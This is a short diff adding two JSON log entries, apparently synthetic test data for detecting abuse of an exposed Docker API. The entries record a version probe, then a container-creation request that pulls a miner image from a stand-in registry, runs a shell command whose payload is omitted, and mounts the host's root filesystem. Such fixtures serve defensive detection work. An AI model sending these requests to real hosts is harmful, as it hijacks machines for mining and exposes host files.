@@ -1,0 +1,2 @@
+{"ts":"2026-10-24T11:25:00+00:00","src_ip":"203.0.113.71","method":"GET","path":"/version"}
+{"ts":"2026-10-24T11:25:04+00:00","src_ip":"203.0.113.71","method":"POST","path":"/containers/create","query":"name=sample","body":{"Image":"example.invalid/sample/miner:latest","Cmd":["sh","-c","<SYNTHETIC PAYLOAD OMITTED>"],"HostConfig":{"Binds":["/:/host:ro"]}}}
